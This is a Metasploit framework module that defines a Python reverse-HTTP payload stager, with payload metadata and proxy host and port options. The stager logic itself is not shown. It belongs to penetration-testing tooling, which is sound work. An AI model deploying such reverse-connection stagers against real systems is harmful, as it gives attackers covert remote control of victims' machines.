##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_http'
require 'msf/core/payload/python'
require 'msf/core/payload/python/reverse_http'

module Metasploit4

  CachedSize = 466

  include Msf::Payload::Stager
  include Msf::Payload::Python
  include Msf::Payload::Python::ReverseHttp

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Python Reverse HTTP Stager',
      'Description'   => 'Tunnel communication over HTTP',
      'Author'        => 'Spencer McIntyre',
      'License'       => MSF_LICENSE,
      'Platform'      => 'python',
      'Arch'          => ARCH_PYTHON,
      'Handler'       => Msf::Handler::ReverseHttp,
      'Stager'        => {'Payload' => ""}
    ))

    register_options(
      [
        OptString.new('PayloadProxyHost', [false, "The proxy server's IP address"]),
        OptPort.new('PayloadProxyPort', [true, "The proxy port to connect to", 8080 ])
      ], self.class)
  end

end
